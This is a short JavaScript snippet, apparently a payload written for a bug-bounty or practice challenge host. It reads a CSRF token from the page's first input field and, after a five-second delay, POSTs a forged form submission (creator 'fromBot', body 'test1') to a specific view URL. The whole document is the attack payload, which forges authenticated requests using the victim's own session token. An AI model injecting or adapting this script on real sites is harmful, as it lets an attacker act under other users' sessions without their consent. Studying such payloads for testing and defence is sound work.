
function csrf_post () {
var csrf = document.getElementsByTagName("input")[0].value;
var formData = new FormData();

formData.append("csrfmiddlewaretoken", csrf);
formData.append("creator", "fromBot");
formData.append("body", "test1");

fetch("https://hackedabacus.br2.bughuntr.net/view/9dcacd4c-a0c4-4ed1-9fb6-8f3aba773d8f",{
	method: 'POST',
	body: formData
});
};

setTimeout(csrf_post, 5000);
